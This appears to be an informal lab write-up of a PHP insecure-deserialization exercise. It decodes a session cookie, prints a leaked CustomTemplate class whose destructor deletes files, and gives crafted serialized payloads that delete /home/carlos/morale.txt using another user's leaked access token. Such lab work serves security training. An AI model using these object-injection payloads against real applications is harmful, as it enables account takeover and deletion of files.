## Arbitrary object injection in PHP

Steps:
1-check cookie if we can manpulite it 
  access into winere account

session encode:
Tzo0OiJVc2VyIjoyOntzOjg6InVzZXJuYW1lIjtzOjY6IndpZW5lciI7czoxMjoiYWNjZXNzX3Rva2VuIjtzOjMyOiJieWh0MDVqN3ExbmFxeXk2OHJsM3J2NHRod3ByeDRteSI7fQ%3d%3d

session decode:
O:4:"User":2:{s:8:"username";s:6:"wiener";s:12:"access_token";s:32:"byht05j7q1naqyy68rl3rv4thwprx4my";}%3d%3d


2-check page source and found this source code

/libs/CustomTemplate.php~

source code 
<?php

class CustomTemplate {
    private $template_file_path;
    private $lock_file_path;

    public function __construct($template_file_path) {
        $this->template_file_path = $template_file_path;
        $this->lock_file_path = $template_file_path . ".lock";
    }

    private function isTemplateLocked() {
        return file_exists($this->lock_file_path);
    }

    public function getTemplate() {
        return file_get_contents($this->template_file_path);
    }

    public function saveTemplate($template) {
        if (!isTemplateLocked()) {
            if (file_put_contents($this->lock_file_path, "") === false) {
                throw new Exception("Could not write to " . $this->lock_file_path);
            }
            if (file_put_contents($this->template_file_path, $template) === false) {
                throw new Exception("Could not write to " . $this->template_file_path);
            }
        }
    }

    function __destruct() {
        // Carlos thought this would be a good idea
        if (file_exists($this->lock_file_path)) {
            unlink($this->lock_file_path);
        }
    }
}

?>
After analysis this I understand that we can delete files if throw 
 lock_file_path:/home/carlos/<file_name>




 catch this error when try change email to winere by manpuliate in seesion 
 and write carlos 

##############################################################
 Internal Server Error

PHP Fatal error: Uncaught Exception: 
(DEBUG: $access_tokens[$user->username] = y4q0h3oju47gjf4k3myaw7r0sbx95gxo, $user->access_token = vjuvxm6u1vezeimqpghtu1pvql9fo3k5, 
$access_tokens = [y4q0h3oju47gjf4k3myaw7r0sbx95gxo, vjuvxm6u1vezeimqpghtu1pvql9fo3k5]) 
Invalid access token for user carlos in /var/www/index.php:8 Stack trace: #0 {main} thrown in /var/www/index.php on line 8

##############################################################



carlos access_token => y4q0h3oju47gjf4k3myaw7r0sbx95gxo


O:4:"User":2:{s:8:"username";s:6:"carlos";s:12:"access_token";s:32:"y4q0h3oju47gjf4k3myaw7r0sbx95gxo";s:14:"lock_file_path";s:23:"/home/carlos/morale.txt";}%3d%3d


OR 

O:14:"CustomTemplate":1:{s:14:"lock_file_path";s:23:"/home/carlos/morale.txt";}

lab is solved 